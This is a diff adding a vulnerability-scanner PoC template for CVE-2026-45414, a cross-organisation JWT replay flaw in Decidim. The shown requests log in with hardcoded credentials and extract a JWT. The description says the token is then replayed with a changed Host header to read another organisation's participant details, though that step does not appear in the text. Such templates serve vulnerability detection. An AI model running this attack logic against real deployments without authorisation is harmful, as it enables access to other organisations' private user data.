@@ -1,0 +1,46 @@
+[info]
+author = "AVE"
+description = "检测Decidim JWT跨组织重放漏洞：获取Org 1的JWT后，修改Host头重放至Org 2的GraphQL API，验证能否读取participantDetails字段"
+id = "POC-AVE-2026-0281"
+name = "CVE-2026-45414 PoC"
+severity = "high"
+tags = [
+    "cve-2026-45414",
+    "jwt",
+    "replay",
+    "decidim",
+]
+vuln_id = [
+    "CVE-2026-45414",
+    "AVE-2026-0281",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/api/auth"
+protocol = "http"
+
+[poc.requests.body]
+content = '{"email":"admin@org1.org","password":"password"}'
+type = "json"
+
+[[poc.requests.extractors]]
+group = 1
+name = "jwt_token"
+part = "body"
+regex = ['"token":"([^"]+)"']
+type = "regex"
+value = "jwt_token"
+
+[poc.requests.headers]
+Content-Type = "application/json"
+Host = "org1.localhost:3000"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["token"]
